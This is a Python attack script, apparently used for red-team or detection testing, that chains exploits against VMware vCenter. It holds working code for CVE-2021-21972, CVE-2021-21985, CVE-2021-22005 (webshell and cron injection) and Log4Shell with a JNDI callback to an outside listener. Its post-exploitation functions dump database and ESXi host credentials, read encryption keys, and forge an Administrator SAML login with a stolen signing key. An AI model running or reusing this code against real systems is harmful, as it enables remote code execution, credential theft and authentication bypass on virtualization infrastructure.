import base64
import random
import ssl
import string
import time
import zlib
from base64 import b64encode
from io import BytesIO
from urllib.parse import urlparse, parse_qs
from zipfile import ZipFile, ZIP_DEFLATED

import lxml.etree as etree
import requests
import urllib3
import xmltodict
from OpenSSL import crypto
from requests import Session

urllib3.disable_warnings()
s = Session()
s.verify = False

'''                     6.5         6.7         7.0
1.psql信息查询
2.EAM文件读取
3.CVE-2021-21985
4.log4j2
5.CVE-2021-21972
6.provider-logo
7.SAML登录
8.SOAP探测
9.SSH登录
10.PowerCli
11.CVE-2021-22005
12.异常jsp访问
'''


def vcenter_version(config):
    print('-------------------(1)SOAP版本探测测试-------------------')
    SM_TEMPLATE = b"""<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <env:Body>
          <RetrieveServiceContent xmlns="urn:vim25">
            <_this type="ServiceInstance">ServiceInstance</_this>
          </RetrieveServiceContent>
          </env:Body>
          </env:Envelope>"""

    resp = requests.post(f'https://{config.get("vc_ip")}' + "/sdk", verify=False,
                         timeout=5, data=SM_TEMPLATE, proxies=config.get('proxy'))
    xd = xmltodict.parse(resp.content)
    about_dict = xd['soapenv:Envelope']['soapenv:Body']['RetrieveServiceContentResponse']['returnval']['about']
    [print('\t', ':\t'.join((k, v))) for k, v in about_dict.items()]
    # return build


def eam_file_read(config):
    print('-------------------(2)EAM文件读取测试-------------------')
    r = s.get(f'https://{config.get("vc_ip")}/eam/vib?id=/etc/passwd')
    print(r)


def provider_log(config):
    print('-------------------(3)provider-log SSRF测试-------------------')
    r = s.get(
        f'https://{config.get("vc_ip")}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd', proxies=config.get('proxy'))
    print(r)


def cve2021_21972(config):
    print('-------------------(4)CVE-2021-21972测试-------------------')
    import requests, tarfile, io

    vuln_path = '/ui/vropspluginui/rest/services/uploadova'
    tf = io.BytesIO()
    with tarfile.open(fileobj=tf, mode='w') as f:
        f.add(config.get('local_file'), f'../..{config.get("target_file")}')
    try:
        r = requests.post(
            f'https://{config.get("vc_ip")}{vuln_path}',
            files={"uploadFile": tf.getvalue()},
            proxies=config.get('proxy'),
            verify=False,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                              'Chrome/88.0.4324.182 Safari/537.36 '
            }
        )
        print(r, r.text)
    except Exception as e:
        print(f'[e] {e}')


def cve2021_21985(config):
    print('-------------------(5)CVE-2021-21985测试1-------------------')

    ip = config.get('vc_ip')
    jndi = f'rmi://{config.get("listener_ip")}:{config.get("listener_port")}/exp'
    # jndi = config.get('jndi')

    vul_path = '/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService'
    endpoints = ["/setTargetObject",
                 "/setStaticMethod",
                 "/setTargetMethod",
                 "/setArguments",
                 "/prepare",
                 "/invoke"]
    params = [{"methodInput": [None]},
              {"methodInput": ["javax.naming.InitialContext.doLookup"]},
              {"methodInput": ["doLookup"]},
              {"methodInput": [[jndi]]},
              {"methodInput": []},
              {"methodInput": []}]
    with Session() as s1:
        s1.verify = False
        s1.proxies = config.get('proxy')
        for endpoint, param in zip(endpoints, params):
            try:
                r = s1.post(f'https://{ip}{vul_path}{endpoint}',
                            json=param, timeout=2)
                print(endpoint, ':\t', r.text)
            except Exception as e:
                print(f'error: {e}')

    print('-------------------(5)CVE-2021-21985测试2-------------------')

    cmd = 'whoami'
    endpoint1 = '/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages'
    endpoint2 = '/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty'
    arcname = 'offline_bundle.xml'
    context = """<beans xmlns="http://www.springframework.org/schema/beans"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xsi:schemaLocation="
         http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder">
            <constructor-arg>
              <list>
                <value>/bin/bash</value>
                <value>-c</value>
                <value><![CDATA[ {cmd} 2>&1 ]]></value>
              </list>
            </constructor-arg>
        </bean>
        <bean id="is" class="java.io.InputStreamReader">
            <constructor-arg>
                <value>#{pb.start().getInputStream()}</value>
            </constructor-arg>
        </bean>
        <bean id="br" class="java.io.BufferedReader">
            <constructor-arg>
                <value>#{is}</value>
            </constructor-arg>
        </bean>
        <bean id="collectors" class="java.util.stream.Collectors"></bean>
        <bean id="system" class="java.lang.System">
            <property name="whatever" value="#{ system.setProperty(&quot;output&quot;, br.lines().collect(collectors.joining(&quot;\n&quot;))) }"/>
        </bean>
    </beans>
    """.replace("{cmd}", cmd)
    fp = BytesIO()
    with ZipFile(fp, 'w', ZIP_DEFLATED) as f:
        f.writestr(arcname, context)
    

    with Session() as s:
        s.verify = False
        # s.proxies = {'https':'http://127.0.0.1:8080'}
        # step 1
        try:
            s.post(
                f'https://{ip}' + endpoint1,
                json={
                    "methodInput": [
                        [
                            'https://localhost:443/vsanHealth/vum/driverOfflineBundle/data:text/html%3Bbase64,{}%23'.format(
                                b64encode(fp.getvalue()).decode())]
                    ]})

            # step 2
            r = s.post(
                f'https://{ip}' + endpoint2,
                json={"methodInput": ["output", None]}
            )
            print(r.json().get('result'))
        except Exception as e:
            print(f'error: {e}')


def cve2021_22005(config):
    print('-------------------(12)CVE-2021-22005测试-------------------')
    url = f'https://{config.get("vc_ip")}'

    def randname(length=5):
        return ''.join(random.choices(string.ascii_letters, k=length))

    # ----------------------------------exp1------------------------------------
    endpoint = '/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent'
    shell_name = f"{randname()}.jsp"
    webshell_path = "/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s" % shell_name
    shell_code = """<% out.println(148666); %>"""
    json_data1 = {
        "manifestSpec": {},
        "objectType": "a2",
        "collectionTriggerDataNeeded": True,
        "deploymentDataNeeded": True,
        "resultNeeded": True,
        "signalCollectionCompleted": True,
        "localManifestPath": "a7",
        "localPayloadPath": "a8",
        "localObfuscationMapPath": "a9"
    }
    md = """<manifest recommendedPageSize="500">
           <request>
              <query name="vir:VCenter">
                 <constraint>
                    <targetType>ServiceInstance</targetType>
                 </constraint>
                 <propertySpec>
                    <propertyNames>content.about.instanceUuid</propertyNames>
                    <propertyNames>content.about.osType</propertyNames>
                    <propertyNames>content.about.build</propertyNames>
                    <propertyNames>content.about.version</propertyNames>
                 </propertySpec>
              </query>
           </request>
           <cdfMapping>
              <indepedentResultsMapping>
                 <resultSetMappings>
                    <entry>
                       <key>vir:VCenter</key>
                       <value>
                          <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                             <resourceItemToJsonLdMapping>
                                <forType>ServiceInstance</forType>
                             <mappingCode><![CDATA[    
                                #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
                                #set($orig_log = $appender.getFile())##
                                #set($logger = $GLOBAL-logger.logger.parent)##     
                                $appender.setFile("%s")##     
                                $appender.activateOptions()##  
                                $logger.warn("%s")##   
                                $appender.setFile($orig_log)##     
                                $appender.activateOptions()##]]>
                             </mappingCode>
                             </resourceItemToJsonLdMapping>
                          </value>
                       </value>
                    </entry>
                 </resultSetMappings>
              </indepedentResultsMapping>
           </cdfMapping>
           <requestSchedules>
              <schedule interval="1h">
                 <queries>
                    <query>vir:VCenter</query>
                 </queries>
              </schedule>
           </requestSchedules>
        </manifest>""" % (webshell_path, shell_code)
    json_data2 = {
        "contextData": "a3", "manifestContent": md, "objectId": "a2"
    }
    ci = {'_c': randname(),
          '_i': randname()
          }
    # ----------------------------------exp2------------------------------------
    endpoint2 = '/analytics/telemetry/ph/api/hyper/send'
    ci2 = {'_c': '',
           '_i': f'/{randname()}'
           }
    cmd = f'touch /tmp/{randname()}'
    task_name = randname()
    payload = f'''* * * * * root rm -rf /etc/cron.d/{task_name}.json /var/log/vmware/analytics/prod/_c_i/
* * * * * root {cmd}'''
    ci3 = {'_c': '',
           '_i': f'/../../../../../../etc/cron.d/{task_name}'
           }

    with Session() as s:
        s.verify = False
        s.proxies = config.get('proxy')
        s.headers = {'X-Deployment-Secret': 'abc'}
        print(f'\t{"-" * 20} poc1 {"-" * 20}')
        r = s.post(f'{url}{endpoint}', params=ci, json=json_data1)
        print(r)
        ci['action'] = 'collect'
        r = s.post(f'{url}{endpoint}', params=ci, json=json_data2)
        print(r)
        url = "%s/idm/..;/%s" % (url, shell_name)
        print(f'check: {url}')
        r = s.get(url)
        print('resp: ', r.text)

        print(f'\t{"-" * 20} poc2 {"-" * 20}')
        print(cmd)
        r = s.post(f'https://{config.get("vc_ip")}{endpoint2}', params=ci2)
        print(r)
        print(task_name)
        r = s.post(f'https://{config.get("vc_ip")}{endpoint2}', params=ci3, data=payload)
        print(r)


def cve2021_44228(config):
    url = f'https://{config.get("vc_ip")}'
    ldap = f'ldap://{config.get("listener_ip")}:{config.get("listener_port")}'
    # ldap = config.get('jndi')
    print('-------------------(6)CVE-2021-44228测试-------------------')
    with Session() as s:
        s.proxies = config.get('proxy')
        s.verify = False
        try:
            r = s.get(f'{url}/ui/login', allow_redirects=False)
            print(r)

            r = s.get(r.headers.get('Location').split('?')[0], headers={
                'X-Forwarded-For': '${jndi:' + ldap + '}'
            }, params={'SAMLRequest': ''}, timeout=2)
            print(r)
        except Exception as e:
            print(f'[-] [{cve2021_44228.__name__}] {e}')
    print(f'host: {config.get("vc_ip")} and sso.message:* and syslog5424_app : websso')


# ---------------------------------------------------------------后渗透部分-------------------------------------------------------------

def psql_query(config):
    """
    cat /etc/vmware-vpx/vcdb.properties
    export PGPASSWORD='7pl^i+<P9=4!HegW'&&psql --username=vc -d VCDB -c 'select ip_address,user_name,password from vpx_host;'
    6.5
    export PGPASSWORD='N^jEi%6OUG)5IY$t'&&/opt/vmware/vpostgres/9.4/bin/psql --username=vc -d VCDB -c 'select ip_address,user_name,password from vpx_host;'
    :param config:
    :return:
    """
    print('-------------------(1)psql查询测试-------------------')
    host = config.get('vc_ip')
    username = config.get('ssh_user')
    passwd = config.get('ssh_pass')
    config_file = '/etc/vmware-vpx/vcdb.properties'

    from paramiko.client import SSHClient
    import paramiko
    client = SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=username, password=passwd)
    _stdin, _stdout, _stderr = client.exec_command(f"shell cat {config_file}")
    conf = [v.split('=', 1) for v in _stdout.read().decode().split('\n')]
    
    vc_password = ''
    for it in conf:
        if it[0].strip() == 'password':
            vc_password = it[1].strip().replace('<', '\\\\<').replace('>', '\\\\>')
    assert vc_password is not None
    
    client.connect(host, username=username, password=passwd)
    cmd = "shell export PGPASSWORD='" + vc_password + "'&&psql --username=vc -d VCDB -c 'select ip_address,user_name," \
                                                      "password from vpx_host;' "
    print(cmd)
    _stdin, _stdout, _stderr = client.exec_command(cmd)
    # _stdin.write(b'whoami\n')
    print(_stdout.read().decode())
    # [print(std.read().decode()) for std in ( _stdout, _stderr)]
    # _stdin.write(b'whoami')
    
    print('[+] psql测试完成')
    exit(0)

    out_str = _stdout.read().decode().split('\n')

    # 解析IP username enc_passwd
    config_list = [l.split('|') for l in out_str if '|' in l]
    ip_user_pass = [(v[0].strip(), v[1].strip(), v[2].strip()[1:]) for v in config_list[1:]]
    

    cmd = 'shell cat /etc/vmware-vpx/ssl/symkey.dat'
    client.connect(host, username=username, password=passwd)
    _stdin, _stdout, _stderr = client.exec_command(cmd)

    symkey = _stdout.read().decode()
    for i, u, p in ip_user_pass:
        print('*' * 60)
        print('%-10s:' % 'ip', i)
        print('%-10s:' % 'user', u)
        decoded_pass = base64.b64decode(p)
        print('%-10s:' % 'iv', decoded_pass[:16].hex())
        print('%-10s:' % 'enc_pass', decoded_pass[16:].hex())
        # 解密
        p1 = "{'option':'Hex','string':'%s'},{'option':'Hex','string':'%s'},'CBC','Hex','Raw',{'option':'Hex'," \
             "'string':''},{'option':'Hex','string':''}" % (symkey.strip(), decoded_pass[:16].hex())
        params = {
            'recipe': f'AES_Decrypt({p1})',
            'input': base64.b64encode(decoded_pass[16:].hex().encode()).decode()
        }
        print(f'https://gchq.github.io/CyberChef/#' + '&'.join([f'{k}={v}' for k, v in params.items()]))

        print('*' * 60)

    print('%-10s:' % 'aeskey', symkey.strip())
    print('%-10s:' % 'mode', 'AES/CBC/NoPadding')
    client.close()


def saml_login(config):
    print('-------------------(8)异常SAML请求测试-------------------')

    vcenter = config.get('vc_ip')
    proxies = config.get('proxy')

    def get_hostname(vcenter=vcenter):
        import socket
        try:
            print('[*] Obtaining hostname from vCenter SSL certificate')
            dst = (vcenter, 443)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(dst)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=dst[0])

            # get certificate
            cert_bin = s.getpeercert(True)
            x509 = crypto.load_certificate(crypto.FILETYPE_ASN1, cert_bin)
            hostname = x509.get_subject().CN
            print(f'[*] Found hostname {hostname} for {vcenter}')
            return hostname
        except:
            print('[-] Failed obtaining hostname from SSL certificates for {vcenter}')
            raise

    def saml_request(vcenter=vcenter):
        """Get SAML AuthnRequest from vCenter web UI"""
        try:
            print(f'[*] Initiating SAML request with {vcenter}')
            r = requests.get(f"https://{vcenter}/ui/login", allow_redirects=False, verify=False, proxies=proxies)
            if r.status_code != 302:
                raise Exception("expected 302 redirect")
            o = urlparse(r.headers["location"])
            domain = o.path.split('/')[-1]
            sr = parse_qs(o.query)["SAMLRequest"][0]
            relay_state = parse_qs(o.query).get("RelayState")
            if relay_state is not None:
                relay_state = relay_state[0]
            dec = base64.decodebytes(sr.encode("utf-8"))
            req = zlib.decompress(dec, -8)
            
            return etree.fromstring(req), domain, relay_state
        except:
            print(f'[-] Failed initiating SAML request with {vcenter}')
            raise

    def fill_template(vcenter_hostname, vcenter_ip, vcenter_domain, req):
        # generate ts
        from datetime import datetime, timedelta
        before = (datetime.today() - timedelta(days=30)).isoformat()[:-3] + 'Z'
        after = (datetime.today() + timedelta(days=30)).isoformat()[:-3] + 'Z'
        response_template = \
            r"""<?xml version="1.0" encoding="UTF-8"?>
            <saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="https://$VCENTER_IP/ui/saml/websso/sso" ID="_eec012f2ebbc1f420f3dd0961b7f4eea" InResponseTo="$ID" IssueInstant="$ISSUEINSTANT" Version="2.0">
              <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
              <saml2p:Status>
                <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
                <saml2p:StatusMessage>Request successful</saml2p:StatusMessage>
              </saml2p:Status>
              <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="_91c01d7c-5297-4e53-9763-5ef482cb6184" IssueInstant="$ISSUEINSTANT" Version="2.0">
                <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
                <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"></ds:Signature>
                <saml2:Subject>
                  <saml2:NameID Format="http://schemas.xmlsoap.org/claims/UPN">Administrator@$DOMAIN</saml2:NameID>
                  <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                    <saml2:SubjectConfirmationData InResponseTo="$ID" NotOnOrAfter="$NOT_AFTER" Recipient="https://$VCENTER/ui/saml/websso/sso"/>
                  </saml2:SubjectConfirmation>
                </saml2:Subject>
                <saml2:Conditions NotBefore="$NOT_BEFORE" NotOnOrAfter="$NOT_AFTER">
                  <saml2:ProxyRestriction Count="10"/>
                  <saml2:Condition xmlns:rsa="http://www.rsa.com/names/2009/12/std-ext/SAML2.0" Count="10" xsi:type="rsa:RenewRestrictionType"/>
                  <saml2:AudienceRestriction>
                    <saml2:Audience>https://$VCENTER/ui/saml/websso/metadata</saml2:Audience>
                  </saml2:AudienceRestriction>
                </saml2:Conditions>
                <saml2:AuthnStatement AuthnInstant="$ISSUEINSTANT" SessionIndex="_50082907a3b0a5fd4f0b6ea5299cf2ea" SessionNotOnOrAfter="$NOT_AFTER">
                  <saml2:AuthnContext>
                    <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
                  </saml2:AuthnContext>
                </saml2:AuthnStatement>
                <saml2:AttributeStatement>
                  <saml2:Attribute FriendlyName="Groups" Name="http://rsa.com/schemas/attr-names/2009/01/GroupIdentity" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Users</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Administrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\CAAdmins</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\ComponentManager.Administrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.BashShellAdministrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.Administrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\LicenseService.Administrators</saml2:AttributeValue>
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Everyone</saml2:AttributeValue>
                  </saml2:Attribute>
                  <saml2:Attribute FriendlyName="userPrincipalName" Name="http://schemas.xmlsoap.org/claims/UPN" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                    <saml2:AttributeValue xsi:type="xsd:string">Administrator@$DOMAIN</saml2:AttributeValue>
                  </saml2:Attribute>
                  <saml2:Attribute FriendlyName="Subject Type" Name="http://vmware.com/schemas/attr-names/2011/07/isSolution" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                    <saml2:AttributeValue xsi:type="xsd:string">false</saml2:AttributeValue>
                  </saml2:Attribute>
                  <saml2:Attribute FriendlyName="surname" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                    <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN</saml2:AttributeValue>
                  </saml2:Attribute>
                  <saml2:Attribute FriendlyName="givenName" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
                    <saml2:AttributeValue xsi:type="xsd:string">Administrator</saml2:AttributeValue>
                  </saml2:Attribute>
                </saml2:AttributeStatement>
              </saml2:Assertion>
            </saml2p:Response>
            """
        
        try:
            
            response = response_template.replace("$VCENTER_IP", vcenter_ip). \
                replace("$VCENTER", vcenter_hostname). \
                replace("$DOMAIN", vcenter_domain). \
                replace("$ID", req.get("ID")). \
                replace("$ISSUEINSTANT", req.get("IssueInstant")). \
                replace("$NOT_BEFORE", before). \
                replace("$NOT_AFTER", after)
            return etree.fromstring(response.encode("utf-8"))
        except Exception as e:
            print(f'[-] Failed generating the SAML assertion: {e}')
            raise

    def get_key_ldap():
        try:
            from ldap3 import Connection
            user = config.get('ldap_user')
            passwd = config.get('ldap_pass')
            conn = Connection(vcenter, user, passwd, auto_bind=True)
            conn.search(
                search_base='dc=vsphere,dc=local',
                search_filter='(objectclass=vmwSTSTenantCredential)',
                attributes=['vmwSTSPrivateKey', 'userCertificate']
            )
            sts_private_key = dict(conn.response[0]['attributes'])['vmwSTSPrivateKey']
            certs_byte = dict(conn.response[0]['attributes'])['userCertificate']
            key = "-----BEGIN PRIVATE KEY-----\n" + base64.encodebytes(sts_private_key).decode(
                "utf-8").rstrip() + "\n-----END PRIVATE KEY----- "
            certs = ["-----BEGIN CERTIFICATE-----\n" + base64.encodebytes(data).decode(
                "utf-8").rstrip() + "\n-----END CERTIFICATE-----" for data in certs_byte]
            
            return key, certs
        except Exception as e:
            print(f'{e}')
            raise

    def sign_assertion(root, key, cert):
        from signxml import XMLSigner
        """Sign the SAML assertion in the response using the IdP key"""
        try:
            print('[*] Signing the SAML assertion')
            assertion_id = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion").get("ID")
            signer = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#")
            signed_assertion = signer.sign(root, reference_uri=assertion_id, key=key, cert=cert)
            return signed_assertion
        except:
            print('[-] Failed signing the SAML assertion')
            raise

    def check_cookie(t, c):
        r = requests.get(f'https://{t}/ui/usersession', headers={'Cookie': c}, verify=False,
                         proxies=config.get('proxy'))
        print(r)
        print(r.text)

    def login(vcenter, saml_resp, rs):
        """Log in to the vCenter web UI using the signed response and return a session cookie"""
        try:
            print('[*] Attempting to log into vCenter with the signed SAML request')
            resp = etree.tostring(saml_resp, xml_declaration=True, encoding="UTF-8", pretty_print=False)
            
            r = requests.post(
                f"https://{vcenter}/ui/saml/websso/sso",
                allow_redirects=False,
                verify=False,
                data={"SAMLResponse": base64.encodebytes(resp),
                      'RelayState': rs},
                proxies=proxies
                # proxies={'https': 'http://127.0.0.1:8080'}
            )
            if r.status_code != 302:
                raise Exception("expected 302 redirect")
            cookie = r.headers["Set-Cookie"].split(";")[0]
            print(f'[+] Successfuly obtained Administrator cookie for {vcenter}!')
            print(f'[+] Cookie: {cookie}')
            return cookie
        except:
            print('[-] Failed logging in with SAML request')
            raise

    vc_hostname = get_hostname()
    vc_req, vc_domain, relay_state = saml_request()
    saml_resp = fill_template(vc_hostname, vcenter, vc_domain, vc_req)
    sign_key, cert = get_key_ldap()
    signed_resp = sign_assertion(saml_resp, sign_key, cert)
    c = login(vcenter, signed_resp, relay_state)
    check_cookie(vcenter, c)
    print(f'host: {vcenter} and sso.message:*')


def ssh_test(config):
    try:
        print('-------------------(9)SSH登录测试-------------------')
        host = config.get('vc_ip')
        username = config.get('ssh_user')
        passwd = config.get('ssh_pass')
        from paramiko.client import SSHClient
        import paramiko
        client = SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=passwd)
        _stdin, _stdout, _stderr = client.exec_command("shell whoami")
        print(_stdout.read().decode())
        client.close()
    except:
        pass


def powercli(config):
    def dn2upn(dn: str):
        dn_parts = dn.split(',')
        name = dn_parts[0].split('=')[1]
        domain = '.'.join([part.split('=')[1] for part in dn_parts[1:] if 'dc=' in part])
        return f'{name}@{domain}'

    print('-------------------(10)PowerCli操作测试-------------------')

    import subprocess
    server = config.get('vc_ip')
    ldap_user = config.get('ldap_user')
    user = dn2upn(ldap_user)
    password = config.get('ldap_pass')
    cmd = f'Connect-VIServer -Server {server} -Protocol https -User {user} -Password {password} -Force'
    cmd = cmd.encode('utf_16_le')
    # 6.7.0 测试用户名参数需要用UPN格式， DN格式会报错
    with subprocess.Popen(["powershell", "-encodedCommand", b64encode(cmd).decode()], stdout=subprocess.PIPE) as proc:
        # pass
        print(proc.stdout.read().decode('gbk'))


def listener(config):
    import socket  # 导入 socket 模块
    s = socket.socket()  # 创建 socket 对象
    host = config.get('listener_ip')  # 获取本地主机名
    port = config.get('listener_port')  # 设置端口
    s.bind((host, int(port)))  # 绑定端口
    print(f'[+] [listener] listening at {(host, port)}')
    s.listen(5)  # 等待客户端连接
    print('[+] [listener] waiting for connection...')
    while True:
        c, addr = s.accept()  # 建立客户端连接
        print(f'[+] [listener] incoming connection from {addr}')
        print(f'[+] [listener] recv 3 bytes: {c.recv(3).hex()}')
        c.close()
    s.close()
    print('bye')


def main():
    import configparser
    config = configparser.ConfigParser()
    config.read('example.ini')
    config = config['vc70']

    from multiprocessing import Process
    from datetime import datetime
    print('time:', datetime.today())
    p1 = Process(target=listener, args=(config,))
    p1.start()
    try:
        print(f'[+] ip {config.get("vc_ip")}')
        # 以下测试项目不需要凭据
        # vcenter_version(config)
        # eam_file_read(config)
        # provider_log(config)
        # cve2021_21972(config)
        # cve2021_21985(config)
        # 22005包含异常jsp访问
        # cve2021_22005(config)
        cve2021_44228(config)

        # 以下为后渗透, 需要配置ssh和ldap密码
        # ssh_test(config)
        # saml_login(config)
        # 需要安装PowerCLI
        # powercli(config)

        # 仅支持7.0以上
        # psql_query(config)
    except Exception as e:
        print(e)
        pass
    time.sleep(5)
    print(f'[+] [{listener.__name__}] reach timeout(5s), terminate')
    p1.terminate()


if __name__ == '__main__':
    main()
